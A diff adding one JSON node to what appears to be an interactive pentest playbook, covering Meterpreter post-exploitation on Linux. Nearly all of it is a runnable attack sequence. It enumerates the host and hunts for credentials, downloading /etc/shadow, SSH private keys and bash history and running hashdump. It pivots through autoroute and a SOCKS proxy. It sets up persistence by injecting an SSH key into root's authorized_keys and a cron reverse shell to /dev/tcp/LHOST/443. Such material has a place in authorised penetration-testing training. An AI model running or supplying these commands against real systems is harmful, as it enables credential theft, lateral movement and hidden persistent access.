@@ -1,0 +1,34 @@
+{
+  "id": "msf_post_linux",
+  "phase": "POST",
+  "title": "Meterpreter — Linux Post Exploitation",
+  "body": "Dedicated Meterpreter post-exploit workflow for Linux. Situational awareness → privesc → credential hunting → pivot.",
+  "cmd": "# ── STEP 1: SITUATIONAL AWARENESS ────────────────────\nsysinfo                            # OS, hostname, arch\ngetuid                             # current user\ngetpid                             # current process\nps                                 # running processes\n\n# ── STEP 2: SHELL + MANUAL ENUM ──────────────────────\nshell                              # drop to bash/sh\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'  # upgrade TTY\nid                                 # uid/gid/groups\nsudo -l                            # sudo permissions\ncat /etc/passwd                    # all users\ncat /etc/crontab                   # cron jobs\nfind / -perm -4000 2>/dev/null     # SUID binaries\nuname -a                           # kernel version\ncat /proc/version\nss -ntlp                           # listening services\nip a                               # network interfaces — find pivot subnets\narp -a                             # other live hosts\nexit                               # back to meterpreter\n\n# ── STEP 3: UPLOAD + RUN LINPEAS ──────────────────────\nupload /home/kali/tools/linpeas.sh /tmp/linpeas.sh\nshell\nchmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null | tee /tmp/out.txt\nexit\ndownload /tmp/out.txt              # pull results to Kali\n\n# ── STEP 4: FILE HUNTING ──────────────────────────────\nsearch -f *.conf -d /etc          # config files\nsearch -f *password* -d /home     # password files\nsearch -f id_rsa -d /home         # SSH private keys\nsearch -f .bash_history -d /home  # command history\ndownload /etc/shadow               # shadow file (needs root)\ndownload /root/.ssh/id_rsa         # root SSH key (needs root)\n\n# ── STEP 5: PRIVILEGE ESCALATION ──────────────────────\n# Try getsystem (limited on Linux):\ngetsystem\n\n# Better — drop to shell and use manual techniques:\nshell\n# sudo -l → check GTFOBins\n# SUID → check GTFOBins\n# Writable cron → inject reverse shell\n# Kernel exploit → check uname -a version\n\n# ── STEP 6: POST-EXPLOITATION MODULES ─────────────────\nbg                                 # background session\nrun post/linux/gather/hashdump     # dump /etc/shadow\nrun post/linux/gather/enum_configs # enumerate config files\nrun post/linux/gather/enum_network # network info\nrun post/multi/recon/local_exploit_suggester  # suggest exploits\n\n# ── STEP 7: PIVOT ─────────────────────────────────────\n# Check for internal networks first:\nshell\nip a                               # look for multiple interfaces\nip route                           # routing table\nexit\n\nbg\nuse multi/manage/autoroute\nset SESSION <id>\nrun\nroute print\n\nuse auxiliary/server/socks_proxy\nset SRVHOST 127.0.0.1\nset VERSION 5\nrun -j\n# proxychains4.conf: socks5 127.0.0.1 1080\n\n# ── STEP 8: PERSISTENCE ───────────────────────────────\nshell\n# Add SSH key:\necho \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys\n# Add cron reverse shell:\necho \"* * * * * root bash -i >& /dev/tcp/LHOST/443 0>&1\" >> /etc/crontab",
+  "warn": "Linux Meterpreter has fewer built-in post-exploit features than Windows. Drop to shell for most Linux privesc work. getsystem rarely works on Linux — use manual techniques.",
+  "choices": [
+    {
+      "label": "Sudo misconfiguration",
+      "next": "sudo_check"
+    },
+    {
+      "label": "SUID binaries",
+      "next": "suid_check"
+    },
+    {
+      "label": "Run LinPEAS",
+      "next": "linpeas"
+    },
+    {
+      "label": "Pivot to internal network",
+      "next": "pivot_start"
+    },
+    {
+      "label": "Full Linux post exploit (manual)",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Back to MSF",
+      "next": "msfconsole"
+    }
+  ]
+}
